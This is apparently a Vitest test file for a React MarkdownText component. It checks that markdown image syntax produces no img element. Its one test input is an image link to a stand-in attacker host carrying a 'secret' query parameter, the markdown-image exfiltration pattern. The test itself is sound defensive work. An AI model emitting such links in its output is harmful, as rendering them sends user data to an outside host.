import { describe, expect, it } from 'vitest';
import { render } from '@testing-library/react';
import { MarkdownText } from './MarkdownText';

describe('MarkdownText', () => {
  it('renders no image, so the browser fetches nothing unasked', () => {
    const { container } = render(
      <MarkdownText>{'Result ![x](https://attacker.example/?q=secret) shown'}</MarkdownText>,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('Result');
  });
});
